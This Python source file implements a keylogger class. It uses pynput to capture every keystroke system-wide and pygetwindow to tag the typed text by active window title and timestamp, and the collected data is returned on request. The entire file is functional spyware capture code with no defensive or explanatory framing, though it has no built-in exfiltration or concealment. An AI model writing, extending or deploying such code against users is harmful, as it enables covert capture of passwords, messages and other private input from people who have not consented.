from datetime import datetime
import pygetwindow as gw
from pynput.keyboard import Listener , Key , KeyCode
from abc import ABC, abstractmethod


class Logger(ABC):
    @abstractmethod
    def start_listening(self):
        pass
    @abstractmethod
    def stop_listening(self):
        pass

class KeyLoggerService(Logger):

    def __init__(self):
        self.data = dict()
        self.listener = Listener(
            on_press=self._on_press
        )
    def start_listening(self):
        """
        Starts listening to keyboard keys
        """
        self.listener.start()

    def stop_listening(self):
        """
        Stops listening to keyboard keys
        """
        self.listener.stop()

    def get_data(self)-> dict:
        """
        Returns a dictionary where the keys
         are the names of the windows in which he types
         and a value which is a dictionary where the
          keys are the timestamp of the typing time
        """
        data = self.data.copy()
        self.data.clear()
        return data

    def _on_press(self , key):
        update_key = KeyLoggerService._correction_keys(key)
        self._get_dict_keys(update_key)

    def _get_dict_keys(self, key):
        """
        Creates a dictionary where the keys are the names
        of the windows in which he types and a value
         which is a dictionary where the keys are the
         timestamp of the typing time
        """
        window = self._get_window()
        if window not in self.data:
            self.data[window] = dict()
        timestamp = self._get_time()
        if timestamp not in self.data[window]:
            self.data[window][timestamp] = str()
        self.data[window][timestamp] += key

    @staticmethod
    def _correction_keys(key) -> str:
        """
        Returns the corrected
        value of the keys typed
        """
        dict_special = {
            Key.space: ' ', Key.enter: '\n', Key.tab: '\t'
        }
        if key in dict_special:
            return dict_special[key]
        elif isinstance(key, KeyCode) and key.vk is not None:
            if 96 <= key.vk <= 105:
                return str(key.vk - 96)
        if hasattr(key, "char") and key is not None:
            return key.char

        return str(key)

    @staticmethod
    def _get_time():
        """
        Returns the timestamp of the typing
        """
        return datetime.now().strftime("%Y-%m-%d %H:%M")
    @staticmethod
    def _get_window():
        """
        Returns the current typing window
        """
        return gw.getActiveWindow().title
